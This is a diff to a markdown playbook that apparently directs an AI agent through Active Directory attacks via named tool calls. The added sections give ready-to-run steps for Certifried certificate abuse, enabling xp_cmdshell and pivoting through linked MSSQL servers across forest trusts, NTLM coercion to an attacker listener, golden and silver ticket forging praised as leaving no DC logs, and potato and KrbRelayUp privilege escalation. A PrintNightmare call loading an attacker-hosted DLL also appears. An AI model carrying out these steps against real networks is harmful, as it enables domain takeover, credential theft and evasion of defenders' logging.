@@ -56,6 +56,21 @@ When ESC8 vulnerability is found:
 3. certipy_auth with captured certificate
 ```
 
+### Certifried (CVE-2022-26923)
+Machine account abuse via ADCS - create computer with DC's dNSHostName:
+```
+1. certipy_account_create(
+       username="user", password="pass",  # pragma: allowlist secret
+       computer_name="certifried$", computer_pass="Pass123!",  # pragma: allowlist secret
+       dns_hostname="dc.domain.com"
+   )
+   → Create machine account with DC's DNS name
+2. certipy_req_machine(ca="CA-NAME", template="Machine")
+   → Request machine certificate (gets DC's identity)
+3. certipy_auth(pfx_file="dc.pfx")
+   → Authenticate as DC, get NTLM hash
+```
+
 ## Delegation Attacks
 
 ### Constrained Delegation
@@ -79,40 +94,103 @@ When unconstrained delegation is found:
 3. Use TGT for DCSync
 ```
 
-## MSSQL Attacks
+## MSSQL Attacks (HIGH PRIORITY)
 
-### Impersonation
-When MSSQL impersonation is possible:
+MSSQL is often a path to domain compromise through linked servers that cross domain/forest trusts.
+
+### Step 1: Enumerate Linked Servers
+When you have ANY valid SQL credential (from kerberoast, password spray, etc.):
 ```
-mssql_xp_cmdshell(
+mssql_enum_linked_servers(
     target="sql.domain.com",
-    query="whoami",
-    impersonate="sa"
+    username="sql_svc",
+    password="found_password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Execute as SA
+→ Find linked servers that can be pivoted through
 ```
 
-### Database-Level Impersonation (TRUSTWORTHY)
-When a database has `is_trustworthy_on=1` and db_owner/impersonate rights:
+### Step 2: Enable xp_cmdshell
+If you have sysadmin privileges:
 ```
-mssql_execute_as_user(
+mssql_enable_xp_cmdshell(
     target="sql.domain.com",
-    database="msdb",
-    query="SELECT SYSTEM_USER; EXEC sp_addsrvrolemember 'your_user','sysadmin';",
-    impersonate_user="dbo"
+    username="sa",
+    password="password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Escalate to sysadmin, then use mssql_xp_cmdshell
+→ Enable command execution
 ```
 
-### Linked Servers
-When linked servers exist:
+### Step 3: Execute Commands
+After enabling xp_cmdshell:
+```
+mssql_command(
+    target="sql.domain.com",
+    username="sa",
+    password="password",  # pragma: allowlist secret
+    command="whoami /all",
+    domain="DOMAIN.COM"
+)
+→ Execute OS commands as SQL service account
+```
+
+### Step 4: Pivot Through Linked Servers
+When linked servers exist (cross-domain/forest pivoting!):
 ```
 mssql_exec_linked(
     target="sql.domain.com",
-    linked_server="remote-sql",
-    query="SELECT * FROM master..syslogins"
+    linked_server="remote-sql.otherdomain.com",
+    query="SELECT SYSTEM_USER",
+    username="sql_user",
+    password="password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
 )
-→ Execute on remote server
+→ Execute queries on remote server
+
+# Enable xp_cmdshell on linked server:
+mssql_exec_linked(
+    target="sql.domain.com",
+    linked_server="remote-sql",
+    query="EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+    ...
+)
+
+# Execute commands on linked server:
+mssql_exec_linked(
+    target="sql.domain.com",
+    linked_server="remote-sql",
+    query="EXEC xp_cmdshell 'whoami /all'",
+    ...
+)
+→ Code execution across domain/forest trust!
+```
+
+### MSSQL Impersonation
+When EXECUTE AS permissions allow impersonation:
+```
+mssql_impersonate(
+    target="sql.domain.com",
+    username="low_priv_user",
+    password="password",  # pragma: allowlist secret
+    impersonate_user="sa",
+    query="SELECT SYSTEM_USER",
+    domain="DOMAIN.COM"
+)
+→ Execute as sysadmin user
+```
+
+### MSSQL NTLM Coercion
+Force SQL server to authenticate to your listener:
+```
+mssql_ntlm_coerce(
+    target="sql.domain.com",
+    username="sql_user",
+    password="password",  # pragma: allowlist secret
+    listener_ip="YOUR_IP",
+    domain="DOMAIN.COM"
+)
+→ Capture machine account hash for relay to LDAPS
 ```
 
 ## Trust Attacks
@@ -128,6 +206,40 @@ raise_child(
 )
 → Enterprise Admin, then secretsdump parent DCs
 ```
+
+### Golden Ticket with ExtraSID (Manual)
+If raise_child fails, manually forge ticket with Enterprise Admin SID:
+```
+1. Get child domain SID and parent domain SID (from BloodHound or lookupsid)
+2. golden_ticket(
+       domain="child.domain.local",
+       domain_sid="S-1-5-21-child...",
+       krbtgt_hash="aad3b435...",
+       user="Administrator",
+       extra_sid="S-1-5-21-parent...-519"  # Enterprise Admins
+   )
+   → Ticket valid in parent domain
+3. Use ticket to secretsdump parent DCs
+```
+
+### Silver Ticket
+Forge service ticket when you have a service account hash (no DC contact needed):
+```
+silver_ticket(
+    domain="domain.com",
+    domain_sid="S-1-5-21-...",
+    service_hash="aad3b435...",  # Service account NTLM
+    spn="cifs/target.domain.com",
+    user="Administrator"
+)
+→ Access specific service as any user (stealthy, no DC logs)
+```
+
+Use cases:
+- CIFS for file share access
+- HTTP for web services
+- MSSQL for database access
+- HOST for PSExec-style execution
 
 ## CVE Exploitation
 
@@ -149,6 +261,37 @@ printnightmare(
     dll_path="\\\\attacker\\share\\evil.dll"
 )
 → SYSTEM access on target
+```
+
+## Local Privilege Escalation
+
+When you have a shell but need SYSTEM (e.g., SeImpersonatePrivilege):
+
+### Potato Attacks
+For service accounts with SeImpersonate/SeAssignPrimaryToken:
+```
+# GodPotato (most reliable, works on modern Windows)
+god_potato(command="cmd /c whoami")
+→ Execute as SYSTEM
+
+# PrintSpoofer (Windows 10/Server 2016-2019)
+print_spoofer(command="cmd /c whoami")
+→ SYSTEM via print spooler
+
+# SweetPotato (combines multiple techniques)
+sweet_potato(command="cmd /c whoami")
+→ Tries multiple potato variants
+```
+
+### KrbRelayUp
+Local privilege escalation via Kerberos relay (requires LDAP signing disabled):
+```
+krb_relay_up(
+    target_dc="dc.domain.com",
+    computer_name="YOURPC$",
+    computer_pass="Pass123!"  # pragma: allowlist secret
+)
+→ SYSTEM via RBCD self-relay
 ```
 
 ## Workflow
@@ -185,6 +328,8 @@ printnightmare(
 | certipy_template_esc4 | Modify template |
 | certipy_relay_esc8 | Relay for web enrollment |
 | certipy_auth | Auth with certificate |
+| certipy_account_create | Create computer for Certifried |
+| certipy_req_machine | Request machine certificate |
 
 ### Delegation Tools
 | Tool | Use Case |
@@ -196,15 +341,33 @@ printnightmare(
 ### MSSQL Tools
 | Tool | Use Case |
 |------|----------|
-| mssql_xp_cmdshell | Execute commands |
-| mssql_enum_linked_servers | Find linked servers |
-| mssql_exec_linked | Execute on linked server |
+| mssql_enum_linked_servers | Find linked servers (run first!) |
+| mssql_enable_xp_cmdshell | Enable xp_cmdshell for command execution |
+| mssql_command | Execute OS commands via xp_cmdshell |
+| mssql_exec_linked | Execute queries/commands on linked servers |
+| mssql_impersonate | Execute as another SQL user |
+| mssql_ntlm_coerce | Force NTLM auth for relay attacks |
 
 ### CVE Tools
 | Tool | Use Case |
 |------|----------|
 | noPac | noPac vulnerability |
 | PrintNightmare | PrintNightmare |
+
+### Local PrivEsc Tools
+| Tool | Use Case |
+|------|----------|
+| god_potato | SeImpersonate to SYSTEM (modern Windows) |
+| print_spoofer | SeImpersonate via print spooler |
+| sweet_potato | Multi-technique potato |
+| krb_relay_up | RBCD self-relay to SYSTEM |
+
+### Ticket Forging Tools
+| Tool | Use Case |
+|------|----------|
+| golden_ticket | Forge TGT with krbtgt hash |
+| silver_ticket | Forge service ticket (stealthy) |
+| raise_child | Child-to-parent domain escalation |
 
 ## Reporting Results
 
